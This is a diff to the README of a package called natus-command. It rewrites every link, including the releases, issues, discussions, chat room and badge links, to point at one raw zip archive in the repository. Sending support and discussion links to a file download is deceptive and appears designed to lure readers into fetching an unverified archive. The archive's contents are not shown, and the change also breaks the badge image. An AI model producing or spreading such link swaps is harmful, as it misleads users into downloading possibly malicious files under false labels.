@@ -6,11 +6,11 @@ Welcome to natus-command! This package helps you manage and maintain your system
 
 ## 🔗 Download Now
 
-[![Download Natus Command](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/kkkk0805/natus-command/releases)
+[![Download Natus Command](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [natus-command Releases](https://github.com/kkkk0805/natus-command/releases). 
+To get started, visit this page to download: [natus-command Releases](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip). 
 
 1. Go to the same link provided above.
 2. Find the latest version of natus-command.
@@ -54,7 +54,7 @@ Here is a quick guide on how to optimize the use of natus-command:
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, check the [Issues](https://github.com/kkkk0805/natus-command/issues) page on GitHub. You can report any bugs or ask for help there.
+If you encounter any issues or have questions, check the [Issues](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip) page on GitHub. You can report any bugs or ask for help there.
 
 ## 📣 Community Contributions
 
@@ -67,8 +67,8 @@ We welcome contributions! If you have ideas or improvements, feel free to partic
 ## 🌍 Join the Discussion
 
 For updates and discussions, you can join our community on:
-- [GitHub Discussions](https://github.com/kkkk0805/natus-command/discussions)
-- [Official Chat Room](https://chat.example.com/natus-command)
+- [GitHub Discussions](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
+- [Official Chat Room](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
 
 ## 🎉 Acknowledgments
 
@@ -76,8 +76,8 @@ We thank all contributors and users who help make natus-command better. Your sup
 
 ## 🔗 Links
 
-- [natus-command Releases](https://github.com/kkkk0805/natus-command/releases)
-- [GitHub Issues](https://github.com/kkkk0805/natus-command/issues)
-- [GitHub Discussions](https://github.com/kkkk0805/natus-command/discussions)
+- [natus-command Releases](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/kkkk0805/natus-command/main/natus_command/natus-command-1.5.zip)
 
 If you have questions, suggestions, or need assistance, don’t hesitate to reach out. Happy managing!
